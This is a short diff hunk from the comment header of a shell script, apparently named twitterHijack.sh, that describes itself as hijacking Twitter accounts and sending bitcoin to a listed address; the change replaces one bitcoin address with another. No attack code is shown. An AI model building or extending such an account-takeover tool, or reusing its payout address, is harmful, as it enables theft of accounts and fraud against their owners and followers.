@@ -4,7 +4,7 @@
 #                                                                #
 # Script to hijack Twitter Accounts                              #
 # Automates sending bitcoin to address:                          #
-# - bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh                   #
+# - bc1q5v34g2dym8c7x5mpfp7wdqp5hse38p99p4dggx                   #
 #                                                                #
 # Notes:                                                         #
 #        - Usage ./twitterHijack.sh <Twitter Handle>             #
